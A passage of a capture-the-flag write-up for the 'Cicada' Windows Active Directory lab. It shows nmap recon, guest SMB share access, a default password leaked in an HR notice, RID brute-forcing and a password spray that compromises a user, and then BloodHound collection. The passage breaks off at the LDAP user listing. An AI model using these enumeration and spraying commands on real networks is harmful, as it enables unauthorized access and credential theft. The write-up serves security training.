### Summary
We start the box by discovering the `SMB` allows guest logins to view the `HR` share which contains a default password. We can perform `RID` brute-forcing to build a list of usernames and we discover `michael.wrightson` is still using the default password. Now with `LDAP` access, we're able to properly enumerate users and we find `david.orelious` has their password in their `LDAP` comments. `david.oprelious` has access to the `DEV` share which stores the credentials for `emily.oscars` in plaintext. `emily.oscars` belongs to the `Backup Operators` group, giving them the `SeBackupPrivilege`, allowing us to read registry hives and leak the administrator hash

### Tools
- `nxc`
- `bloodhound`
- `secretsdump.py`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#nxc Host Generation]]
- [[#SMB - TCP 445]]
	- [[#nxc spider_plus]]
###### [[#User Auth - michael.wrightson]]
- [[#RID User Enumeration]]
- [[#Bloodhound]]
###### [[#User Auth - david.orelious]]
- [[#LDAP - TCP 389]]
###### [[#User Shell - emily.oscars]]
- [[#DEV Share]]
- [[#Bloodhound Part 2]]
- [[#Enumeration as emily.oscars]]
###### [[#Root Shell]]
- [[#Exploiting SeBackupPrivilege]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.20.238 -oN nmap/tcp
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
60438/tcp open  unknown          syn-ack ttl 127

❯ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,60438 -sCV -vv 10.129.20.238 -oN nmap/tcpScripts
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-12 00:20:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-12T00:22:15+00:00; +59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1: 2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1: 2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-12T00:22:15+00:00; +59s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1: 2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-12T00:22:15+00:00; +59s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-12T00:22:15+00:00; +59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1: 2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
60438/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 58s, deviation: 1s, median: 58s
| smb2-time:
|   date: 2026-02-12T00:21:35
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 51396/tcp): CLEAN (Timeout)
|   Check 2 (port 47567/tcp): CLEAN (Timeout)
|   Check 3 (port 4392/udp): CLEAN (Timeout)
|   Check 4 (port 44106/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
- The TTL corresponds with a Windows system
- A lot of the open ports indicate an Active Directory environment
- We've got a Certificate Authority, `CICADA-DC-CA`

### nxc Host Generation
```sh
❯ nxc smb 10.129.20.238 --generate-hosts-file hosts
SMB         10.129.20.238   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)

❯ ccat hosts                                                
10.129.20.238     CICADA-DC.cicada.htb cicada.htb CICADA-DC
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## SMB - TCP 445
---
- We can try the typical `nxc` `smb` enumeration to try and gain access without credentials:
```sh
❯ nxc smb 10.129.20.238 --shares                                
SMB         10.129.20.238   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.20.238   445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

❯ nxc smb 10.129.20.238 -u '' -p '' --shares
SMB         10.129.20.238   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.20.238   445    CICADA-DC        [+] cicada.htb\: 
SMB         10.129.20.238   445    CICADA-DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED

❯ nxc smb 10.129.20.238 -u 'guest' -p '' --shares
Share           Permissions     Remark              
-----           -----------     ------              
ADMIN$                          Remote Admin        
C$                              Default share       
DEV                                                 
HR              READ                                
IPC$            READ            Remote IPC          
NETLOGON                        Logon server share  
SYSVOL                          Logon server share  
```
- Nice! We've got guest access to the default `IPC$` share and a non-default `HR` share!

### nxc spider_plus
- We can spider through all the shares with files and fetch them with `nxc`:
```sh
❯ nxc smb 10.129.20.238 -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
❯ tree 10.129.20.238 
10.129.20.238
└── HR
    └── Notice from HR.txt
```
```text

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
- Wow, a default password, that's nice to see! `Cicada$M6Corpb*@Lp#nZp!8`

# User Auth - michael.wrightson
## RID User Enumeration
---
- We can try to enumerate users via `nxc` with the `guest` account:
```sh
❯ nxc smb 10.129.20.238 -u 'guest' -p '' --users
SMB         10.129.20.238   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.20.238   445    CICADA-DC        [+] cicada.htb\guest: 
```
- No cigar. There's another option we can use thouh, `RID` brute-force:
```sh
❯ nxc smb 10.129.20.238 -u 'guest' -p '' --rid-brute
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup) 
500: CICADA\Administrator (SidTypeUser)                            
501: CICADA\Guest (SidTypeUser)                                    
502: CICADA\krbtgt (SidTypeUser)                                   
512: CICADA\Domain Admins (SidTypeGroup)                           
513: CICADA\Domain Users (SidTypeGroup)                            
514: CICADA\Domain Guests (SidTypeGroup)                           
515: CICADA\Domain Computers (SidTypeGroup)                        
516: CICADA\Domain Controllers (SidTypeGroup)                      
517: CICADA\Cert Publishers (SidTypeAlias)                         
518: CICADA\Schema Admins (SidTypeGroup)                           
519: CICADA\Enterprise Admins (SidTypeGroup)                       
520: CICADA\Group Policy Creator Owners (SidTypeGroup)             
521: CICADA\Read-only Domain Controllers (SidTypeGroup)            
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)            
525: CICADA\Protected Users (SidTypeGroup)                         
526: CICADA\Key Admins (SidTypeGroup)                              
527: CICADA\Enterprise Key Admins (SidTypeGroup)                   
553: CICADA\RAS and IAS Servers (SidTypeAlias)                     
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias) 
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)  
1000: CICADA\CICADA-DC$ (SidTypeUser)                              
1101: CICADA\DnsAdmins (SidTypeAlias)                              
1102: CICADA\DnsUpdateProxy (SidTypeGroup)                         
1103: CICADA\Groups (SidTypeGroup)                                 
1104: CICADA\john.smoulder (SidTypeUser)                           
1105: CICADA\sarah.dantelia (SidTypeUser)                          
1106: CICADA\michael.wrightson (SidTypeUser)                       
1108: CICADA\david.orelious (SidTypeUser)                          
1109: CICADA\Dev Support (SidTypeGroup)                            
1601: CICADA\emily.oscars (SidTypeUser)
```
- Nice! We can build a `users.txt` list with this and test if any still have the default password

```sh
❯ nxc smb 10.129.20.238 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
...
SMB         10.129.20.238   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
...
```
- We want the `--continue-on-success` flag since we get guest logins but that's not what we're looking for
- We get a hit, `michael.wrightson` / `Cicada$M6Corpb*@Lp#nZp!8`
- They unfortunately don't have `WinRM` access
```sh
❯ nxc winrm 10.129.20.238 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
WINRM       10.129.20.238   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) 
WINRM       10.129.20.238   5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```
- But we do have `LDAP`! Bloodhound here we come

## Bloodhound
---
```sh
❯ bloodhound-ce-python -d cicada.htb -ns 10.129.20.238 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --zip

❯ rusthound -d cicada.htb -n 10.129.20.238 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -z --adcs
```
- Popping open `bloodhound` and checking `michael.wrightson`, we don't see anything interesting, we'll have to take a step back from here

# User Auth - david.orelious
## LDAP - TCP 389
---
- Now that we've got `LDAP` access, we can get a greater view of the users on the box:
```sh
❯ nxc ldap 10.129.20.238 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users      
-Username-                    -Last PW Set-       -BadPW-  -Description-                                                
Administrator                 2024-08-26 16:08:03 3        Built-in account for administering the computer/domain       
Guest                         2024-08-28 13:26:56 0        Built-in account for guest access to the computer/domain     
krbtgt                        2024-03-14 07:14:10 3        Key Distribution Center Service Account                      
